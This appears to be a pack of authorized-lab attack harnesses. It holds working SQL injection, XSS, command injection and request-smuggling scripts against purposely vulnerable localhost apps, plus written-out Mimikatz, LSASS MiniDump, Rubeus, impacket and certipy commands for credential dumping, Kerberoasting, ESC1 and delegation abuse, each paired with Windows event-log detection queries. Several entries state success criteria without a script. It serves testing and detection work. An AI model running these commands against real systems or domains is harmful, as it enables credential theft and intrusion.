C-sqli.name: SQL Injection — local sqlite/flask login bypass harness
C-sqli.authorization: Authorized lab/non-prod only, signed RoE. Scope: localhost:5001 deliberately-vulnerable Flask app on the tester's own host only.
C-sqli.setup: Single-file Flask + sqlite app bound to 127.0.0.1:5001 with a string-concatenated login query. No external deps beyond Flask. Run on an isolated lab VM.
C-sqli.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY — localhost target you stood up. Do not run against systems you do not own.
import sqlite3, threading, time, urllib.parse, urllib.request
from flask import Flask, request

app = Flask(__name__)
DB = ':memory:'
_conn = sqlite3.connect(DB, check_same_thread=False)
_conn.execute("CREATE TABLE users(id INTEGER, user TEXT, pass TEXT)")
_conn.execute("INSERT INTO users VALUES (1,'admin','FAKE-s3cret-do-not-use')")
_conn.commit()

@app.route('/login')
def login():
    u = request.args.get('user',''); p = request.args.get('pass','')
    # VULNERABLE ON PURPOSE: string concatenation, no parameterization
    q = "SELECT id FROM users WHERE user='%s' AND pass='%s'" % (u,p)
    try:
        row = _conn.execute(q).fetchone()
    except Exception as e:
        return 'ERR: %s' % e, 500
    return 'AUTH-OK uid=%s' % row[0] if row else 'AUTH-FAIL'

def serve():
    app.run(host='127.0.0.1', port=5001, use_reloader=False)

if __name__ == '__main__':
    threading.Thread(target=serve, daemon=True).start(); time.sleep(1.5)
    base='http://127.0.0.1:5001/login?'
    # Baseline: wrong password -> AUTH-FAIL
    print('baseline:', urllib.request.urlopen(base+urllib.parse.urlencode({'user':'admin','pass':'wrong'})).read().decode())
    # Injection: tautology bypasses the password check
    inj = {'user':"admin' OR '1'='1", 'pass':'x'}
    print('inject  :', urllib.request.urlopen(base+urllib.parse.urlencode(inj)).read().decode())
C-sqli.success_criterion: Baseline request returns 'AUTH-FAIL'; the injected request returns 'AUTH-OK uid=1' without a valid password — proves the input crosses into the SQL parse tree (seam confirmed).
C-sqli.cleanup: Stop the Python process (Ctrl-C). DB is in-memory and vanishes on exit; no files written.
C-sqli.safety: In-memory sqlite, FAKE credential, bound to 127.0.0.1 only; no data is read beyond the seeded row.

C-xss.name: Reflected XSS — local Flask reflection harness
C-xss.authorization: Authorized lab/non-prod only, signed RoE. Scope: localhost:5002 deliberately-vulnerable Flask app on the tester's own host only.
C-xss.setup: Single-file Flask app on 127.0.0.1:5002 that reflects a query param into HTML without escaping. Confirm in a lab browser or via response inspection.
C-xss.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY — localhost target you stood up.
import threading, time, urllib.parse, urllib.request
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q','')
    # VULNERABLE ON PURPOSE: unescaped reflection into HTML, no CSP
    return '<html><body>Results for: %s</body></html>' % q

def serve():
    app.run(host='127.0.0.1', port=5002, use_reloader=False)

if __name__ == '__main__':
    threading.Thread(target=serve, daemon=True).start(); time.sleep(1.5)
    payload = "<script>document.title='XSS-PROOF'</script>"
    url='http://127.0.0.1:5002/search?'+urllib.parse.urlencode({'q':payload})
    body=urllib.request.urlopen(url).read().decode()
    print('reflected body:', body)
    print('UNESCAPED-SCRIPT-PRESENT' if '<script>' in body else 'ESCAPED-SAFE')
C-xss.success_criterion: Response body contains the literal '<script>...' tag (printed 'UNESCAPED-SCRIPT-PRESENT'); opening the URL in a lab browser sets document.title to 'XSS-PROOF' — confirms the payload reaches the DOM as executable markup.
C-xss.cleanup: Stop the Python process (Ctrl-C). No persistence; nothing written to disk.
C-xss.safety: Benign inert payload (sets a title), localhost-only, no cookie theft or network callout.

C-cmdi.name: OS Command Injection — local ping wrapper harness
C-cmdi.authorization: Authorized lab/non-prod only, signed RoE. Scope: localhost:5003 deliberately-vulnerable Flask app on the tester's own host only.
C-cmdi.setup: Single-file Flask app on 127.0.0.1:5003 that passes a 'host' param into a shell command (ping) via shell=True. Run in an isolated lab VM.
C-cmdi.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY — localhost target you stood up.
import threading, time, subprocess, urllib.parse, urllib.request
from flask import Flask, request

app = Flask(__name__)

@app.route('/ping')
def ping():
    host = request.args.get('host','127.0.0.1')
    # VULNERABLE ON PURPOSE: unsanitized input into a shell
    out = subprocess.run('ping -c1 %s' % host, shell=True, capture_output=True, text=True, timeout=5)
    return out.stdout + out.stderr

def serve():
    app.run(host='127.0.0.1', port=5003, use_reloader=False)

if __name__ == '__main__':
    threading.Thread(target=serve, daemon=True).start(); time.sleep(1.5)
    base='http://127.0.0.1:5003/ping?'
    # Benign marker command chained via ';' — proves command boundary break
    inj={'host':'127.0.0.1; echo CMDI-MARKER-$((6*7))'}
    body=urllib.request.urlopen(base+urllib.parse.urlencode(inj)).read().decode()
    print(body)
    print('CMDI-CONFIRMED' if 'CMDI-MARKER-42' in body else 'NO-INJECTION')
C-cmdi.success_criterion: Response contains 'CMDI-MARKER-42' (the injected echo with arithmetic the app never computed) — proves the appended command executed in the same shell, confirming the injection seam.
C-cmdi.cleanup: Stop the Python process (Ctrl-C). No files created.
C-cmdi.safety: Injected command is a benign local 'echo' of a marker string; no destructive ops, no network callout, localhost-only.

C-deser.name: Insecure Deserialization — local pickle gadget harness
C-deser.authorization: Authorized lab/non-prod only, signed RoE. Scope: in-process / localhost on the tester's own host only.
C-deser.setup: Standalone script simulating an endpoint that pickle.loads() attacker-controlled bytes (the classic Python insecure-deserialization pattern). No network listener required.
C-deser.success_criterion: Marker file DESER-PROOF.txt is created in the temp dir during pickle.loads() — proves attacker-controlled bytes triggered code execution via __reduce__, confirming the deserialization seam.
C-deser.cleanup: rm "$TMPDIR/DESER-PROOF.txt" (or %TEMP%); the script also removes it on next run. No services started.
C-deser.safety: The gadget only writes a local marker via echo; no reverse shell, no real payload, no network.

C-ssti.name: Server-Side Template Injection — local Jinja2 harness
C-ssti.authorization: Authorized lab/non-prod only, signed RoE. Scope: localhost:5004 deliberately-vulnerable Flask app on the tester's own host only.
C-ssti.setup: Single-file Flask app on 127.0.0.1:5004 that renders user input as a Jinja2 template string (render_template_string) — the canonical SSTI sink.
C-ssti.success_criterion: Response is 'Hello 49' (the engine evaluated {{7*7}}) instead of echoing the literal — proves user input is compiled/executed by the template engine, confirming SSTI.
C-ssti.cleanup: Stop the Python process (Ctrl-C). No files written.
C-ssti.safety: Probe is harmless arithmetic; no os/subprocess gadget chain is exercised, localhost-only.

C-ssrf.name: SSRF — local fetch proxy against a MOCK metadata server
C-ssrf.authorization: Authorized lab/non-prod only, signed RoE. Scope: two localhost services on the tester's own host; NO real cloud endpoint is ever contacted.
C-ssrf.setup: Two local Flask listeners: (1) a vulnerable 'fetch' app on 127.0.0.1:5005 that GETs any user-supplied URL; (2) a MOCK internal metadata server on 127.0.0.1:5006 returning a fake secret. The mock stands in for 169.254.169.254.
C-ssrf.success_criterion: The front-end '/fetch' response contains 'FAKEAKIA-LAB' (the mock metadata secret) — proves the app was coerced into requesting an internal-only resource on the tester's behalf, confirming SSRF.
C-ssrf.cleanup: Stop the Python process (Ctrl-C). Both listeners are ephemeral; no files written.
C-ssrf.safety: Metadata server is a local mock returning FAKE creds on 127.0.0.1:5006; the real link-local 169.254.169.254 is never contacted.

C-imds.name: Cloud IMDS credential theft — MOCK IMDSv1 vs IMDSv2 detection harness
C-imds.authorization: Authorized lab/non-prod only, signed RoE. Scope: a local mock metadata service on 127.0.0.1:8169 simulating the cloud IMDS; NO real cloud is contacted.
C-imds.setup: Run the mock IMDS (python -m http.server style stub provided) on 127.0.0.1:8169. It serves IMDSv1 (no-token GET) by default. Edit the stub to require the X-aws-ec2-metadata-token header to model IMDSv2 and re-test.
C-imds.script:
#!/usr/bin/env bash
# AUTHORIZED LAB ONLY — mock IMDS on localhost. NEVER curl a real 169.254.169.254.
set -euo pipefail
MOCK=http://127.0.0.1:8169

# 0) Stand up a mock IMDSv1 endpoint (run in another shell, kept here for reference):
#    python3 - <<'PY'
#    from flask import Flask, request
#    app=Flask(__name__)
#    @app.route('/latest/meta-data/iam/security-credentials/lab-role')
#    def c():
#        # IMDSv2 simulation: uncomment to require token
#        # if not request.headers.get('X-aws-ec2-metadata-token'): return 'token required',401
#        return '{"AccessKeyId":"FAKEAKIA-LAB","SecretAccessKey":"FAKE/lab"}'
#    app.run(host='127.0.0.1',port=8169)
#    PY

# 1) IMDSv1-style theft attempt (the classic SSRF-reachable, tokenless GET):
RESP=$(curl -s ${MOCK}/latest/meta-data/iam/security-credentials/lab-role || true)
echo "v1 attempt: ${RESP}"
if echo "${RESP}" | grep -q FAKEAKIA-LAB; then
  echo 'IMDS-SEAM-CONFIRMED: credentials retrievable WITHOUT a session token (IMDSv1 exposed)'
else
  echo 'IMDSv1-BLOCKED: token required -> IMDSv2 hop-limit/token enforced (mitigated)'
fi

# 2) Detection criterion (reference): on a real host, an unexpected process reading
#    the IMDS role path, or VPC flow / host telemetry showing a non-SDK process egress to
#    169.254.169.254, is the success signal. GuardDuty finding:
#    UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration is the cloud-side detection.
C-imds.success_criterion: Mock returns 'FAKEAKIA-LAB' on a tokenless GET (prints IMDS-SEAM-CONFIRMED) — proves IMDSv1 credential exposure. On a real environment the confirming detection is GuardDuty 'InstanceCredentialExfiltration' or host telemetry of a non-SDK process reading the IAM creds path.
C-imds.cleanup: Stop the mock Flask/http.server process. No credentials, no files persisted.
C-imds.safety: All values FAKE, served from a localhost mock; the real link-local IMDS address is never queried.

C-lsass.name: LSASS credential dump — reference invocation + Event-ID detection harness
C-lsass.authorization: Authorized lab/non-prod only, signed RoE. Scope: a dedicated, isolated AD test VM you own; never on production or a real corporate endpoint.
C-lsass.setup: An isolated Windows AD lab VM with Sysmon installed (SwiftOnSecurity config) and Security auditing enabled. No malware is written — this is a validate-and-detect harness using a standard public tool reference.
C-lsass.script:
# AUTHORIZED LAB ONLY — isolated AD test VM. This is a DETECTION harness; no custom malware.
# (a) REFERENCE INVOCATION (standard public tooling, one line, lab AD only):
#     Run a known credential-access tool to dump LSASS, e.g. Mimikatz:
#       mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
#     or the living-off-the-land equivalent:
#       rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\lab\out.dmp full
#
# (b) DETECTION CHECK (the actual deliverable — run after the reference action):
$since = (Get-Date).AddMinutes(-10)
Write-Host '--- Sysmon Event ID 10 (ProcessAccess targeting lsass.exe) ---'
Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; Id=10; StartTime=$since } -ErrorAction SilentlyContinue |
  Where-Object { $_.Message -match 'lsass\.exe' -and $_.Message -match '0x1010|0x1410|0x143a|0x1438' } |
  Select-Object -First 5 TimeCreated, @{n='Detail';e={ ($_.Message -split "`n")[0..6] -join '; ' }}

Write-Host '--- Security 4656/4663 (handle to lsass / object access) ---'
Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4656,4663; StartTime=$since } -ErrorAction SilentlyContinue |
  Where-Object { $_.Message -match 'lsass' } | Select-Object -First 5 TimeCreated, Id
C-lsass.success_criterion: Sysmon Event ID 10 fires with TargetImage=lsass.exe and a GrantedAccess mask of 0x1010/0x1410/0x143a/0x1438 (PROCESS_VM_READ|QUERY); corroborated by Security 4656/4663 handle-open to lsass. Those events confirm the LSASS read seam was exercised and is detectable.
C-lsass.cleanup: Delete any dump file (Remove-Item C:\lab\out.dmp); revert the VM snapshot. Rotate the lab's FAKE krbtgt/account passwords if real dumps occurred.
C-lsass.safety: No exploit code authored; only a reference tool command plus read-only event-log queries. Confined to a throwaway lab VM.

C-kerberoast.name: Kerberoasting — reference invocation + Event-ID detection harness
C-kerberoast.authorization: Authorized lab/non-prod only, signed RoE. Scope: an isolated AD lab domain (e.g. lab.example.test) you own.
C-kerberoast.setup: Isolated AD lab with a service account carrying an SPN and a weak FAKE password, plus Kerberos service-ticket auditing enabled (Audit Kerberos Service Ticket Operations = Success). Standard public tools (Rubeus/impacket) used by reference only.
C-kerberoast.script:
# AUTHORIZED LAB ONLY — isolated AD lab domain you own. Validate-and-detect; no custom malware.
# (a) REFERENCE INVOCATION (standard public tooling, lab AD only) — request roastable TGS tickets:
#     Rubeus:   Rubeus.exe kerberoast /outfile:C:\lab\hashes.txt
#     impacket: GetUserSPNs.py lab.example.test/lowpriv:'FAKE-pw' -dc-ip 127.0.0.1 -request -outputfile hashes.txt
#     (Offline cracking of hashes.txt is out of scope here; the seam is the ticket grant + weak RC4 etype.)
#
# (b) DETECTION CHECK (the deliverable):
$since = (Get-Date).AddMinutes(-10)
Write-Host '--- Security 4769 TGS requests with RC4 (etype 0x17) — Kerberoasting signature ---'
Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4769; StartTime=$since } -ErrorAction SilentlyContinue |
  Where-Object { $_.Message -match 'Ticket Encryption Type:\s*0x17' -and $_.Message -notmatch 'krbtgt' -and $_.Message -match '\$' } |
  Select-Object -First 10 TimeCreated, @{n='Service';e={ if($_.Message -match 'Service Name:\s*(\S+)'){$matches[1]} }}
Write-Host 'A burst of distinct SPNs requested by one principal in seconds = roasting pattern.'
C-kerberoast.success_criterion: Multiple Security Event ID 4769 entries with Ticket Encryption Type 0x17 (RC4) for distinct service SPNs requested by one account in a short window — confirms TGS tickets were harvested for offline cracking (Kerberoasting seam exercised).
C-kerberoast.cleanup: Remove hashes.txt (Remove-Item C:\lab\hashes.txt); reset the lab service account's FAKE password; revert VM snapshot.
C-kerberoast.safety: No cracking performed, no exploit authored; only a reference ticket-request command plus read-only 4769 log analysis in a throwaway lab.

C-adcs-esc.name: AD CS ESC1 — reference invocation + certificate-issuance detection harness
C-adcs-esc.authorization: Authorized lab/non-prod only, signed RoE. Scope: an isolated AD CS lab CA (e.g. lab.example.test) you own with a deliberately misconfigured template.
C-adcs-esc.setup: Isolated AD lab with an Enterprise CA and a certificate template that has ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU and enroll rights for low-priv users (the classic ESC1 misconfig). Certify/Certipy used by reference only.
C-adcs-esc.script:
# AUTHORIZED LAB ONLY — isolated AD CS lab you own. Validate-and-detect; no custom malware.
# (a) ENUMERATE + REFERENCE INVOCATION (standard public tooling, lab only):
#     Find vulnerable templates:   Certify.exe find /vulnerable
#         or:                      certipy find -u lowpriv@lab.example.test -p 'FAKE-pw' -dc-ip 127.0.0.1
#     Request a cert as a different identity (ESC1 SAN abuse):
#         Certify.exe request /ca:CA01\\lab-CA /template:VulnTemplate /altname:Administrator
#         certipy req -u lowpriv@lab.example.test -p 'FAKE-pw' -ca lab-CA -template VulnTemplate -upn administrator@lab.example.test
#
# (b) DETECTION CHECK (the deliverable) — on the CA host:
$since = (Get-Date).AddMinutes(-15)
Write-Host '--- Security 4886/4887 (cert request received / approved-issued) ---'
Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4886,4887; StartTime=$since } -ErrorAction SilentlyContinue |
  Select-Object -First 10 TimeCreated, Id, @{n='Requester';e={ if($_.Message -match 'Requester:\s*(\S+)'){$matches[1]} }}
Write-Host 'RED FLAG: a SAN/UPN (e.g. Administrator) in the issued cert that differs from the low-priv requester.'
C-adcs-esc.success_criterion: Security Event ID 4886 then 4887 show a certificate issued to a low-priv requester but carrying a SAN/UPN of a privileged account (e.g. Administrator) — confirms ESC1 (subject-supplied SAN) was abused to obtain an impersonation cert.
C-adcs-esc.cleanup: Revoke the issued lab certificate (certutil -revoke <serial>); remove the misconfigured template or restore template ACLs; revert VM snapshot.
C-adcs-esc.safety: All identities and passwords are FAKE lab values; only a reference request command plus read-only CA event-log queries; no exploit code authored.

C-delegation.name: Kerberos constrained/unconstrained delegation abuse — reference + detection harness
C-delegation.authorization: Authorized lab/non-prod only, signed RoE. Scope: an isolated AD lab domain you own with a host configured for delegation.
C-delegation.setup: Isolated AD lab with a computer/service account configured for (un)constrained delegation or with msDS-AllowedToActOnBehalfOfOtherIdentity set (RBCD). Kerberos auth auditing enabled. Rubeus/impacket used by reference only.
C-delegation.script:
# AUTHORIZED LAB ONLY — isolated AD lab you own. Validate-and-detect; no custom malware.
# (a) REFERENCE INVOCATION (standard public tooling, lab only) — S4U2self/S4U2proxy abuse (RBCD/constrained):
#     Rubeus.exe s4u /user:WEBSVC$ /rc4:<FAKE-NTLM> /impersonateuser:Administrator /msdsspn:cifs/target.lab.example.test /ptt
#     impacket: getST.py -spn cifs/target.lab.example.test -impersonate Administrator lab.example.test/WEBSVC$ -hashes :<FAKE-NTLM>
#     Enumerate delegation first:  Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
#
# (b) DETECTION CHECK (the deliverable):
$since = (Get-Date).AddMinutes(-10)
Write-Host '--- Security 4769 TGS + 4768 with impersonation; watch for S4U on behalf of a privileged user ---'
Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4769,4624; StartTime=$since } -ErrorAction SilentlyContinue |
  Where-Object { $_.Message -match 'Administrator' } |
  Select-Object -First 10 TimeCreated, Id, @{n='Detail';e={ if($_.Message -match 'Account Name:\s*(\S+)'){$matches[1]} }}
Write-Host 'RED FLAG: a service account obtaining a TGS to a sensitive SPN as Administrator (Transited Services field populated).'
C-delegation.success_criterion: Security Event ID 4769 shows a service account requesting a TGS to a target SPN while impersonating a privileged user (Transited Services / S4U pattern), followed by a 4624 logon as that user from the delegated host — confirms delegation was abused for impersonation.
C-delegation.cleanup: Clear the delegation config (Set-ADComputer -TrustedForDelegation $false / clear msDS-AllowedToActOnBehalfOfOtherIdentity); reset the FAKE service-account hash; revert VM snapshot.
C-delegation.safety: Hashes/accounts are FAKE lab values; only a reference S4U command plus read-only log queries; no exploit code authored; isolated lab.

C-smuggling.name: HTTP Request Smuggling — local front-proxy + back-end CL.TE lab harness
C-smuggling.authorization: Authorized lab/non-prod only, signed RoE. Scope: a local front proxy + back end, both on the tester's own host (127.0.0.1) only.
C-smuggling.setup: Two local listeners on the tester's host: a front-end that forwards using Content-Length and a back-end that honors Transfer-Encoding (a CL.TE desync). Provided as a single self-contained raw-socket lab so the desync is observable without external proxies.
C-smuggling.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY — front-proxy + back-end both on 127.0.0.1 you stood up.
import socket, threading, time

# BACK-END: prefers Transfer-Encoding: chunked (TE). Echoes how many requests it parsed.
def backend():
    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(('127.0.0.1',8081)); s.listen(5)
    while True:
        c,_=s.accept(); data=c.recv(65535).decode('latin1')
        # Count request lines the back end sees (a smuggled 2nd request inflates this)
        n=data.count('GET ')+data.count('POST ')
        c.sendall(('HTTP/1.1 200 OK\r\nContent-Length: 24\r\n\r\nBACKEND-PARSED-REQS=%d   ' % n).encode())
        c.close()

# FRONT-END (proxy): uses Content-Length (CL) to decide body length, then forwards verbatim.
def frontend():
    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(('127.0.0.1',8080)); s.listen(5)
    while True:
        c,_=s.accept(); raw=c.recv(65535)
        b=socket.create_connection(('127.0.0.1',8081)); b.sendall(raw)
        c.sendall(b.recv(65535)); b.close(); c.close()

threading.Thread(target=backend,daemon=True).start()
threading.Thread(target=frontend,daemon=True).start(); time.sleep(1)

# CL.TE desync probe: front honors CL (5 bytes -> '0\r\n\r\n'), back honors TE chunked and
# treats the trailing bytes as the START of a smuggled second request.
body='0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: x\r\n\r\n'
req=('POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n'+body)
c=socket.create_connection(('127.0.0.1',8080)); c.sendall(req.encode())
resp=c.recv(65535).decode('latin1'); c.close()
print(resp)
print('SMUGGLING-CONFIRMED' if 'BACKEND-PARSED-REQS=2' in resp else 'NO-DESYNC (parsers agree)')
C-smuggling.success_criterion: Back end reports 'BACKEND-PARSED-REQS=2' from a single front-end request — proves the front end (CL) and back end (TE) disagreed on message boundaries and a second request was smuggled past the proxy (CL.TE desync confirmed).
C-smuggling.cleanup: Stop the Python process (Ctrl-C). Both sockets close on exit; no files written.
C-smuggling.safety: Both endpoints are localhost stubs; the smuggled request is a benign GET /smuggled with no side effects, no real proxy or target involved.
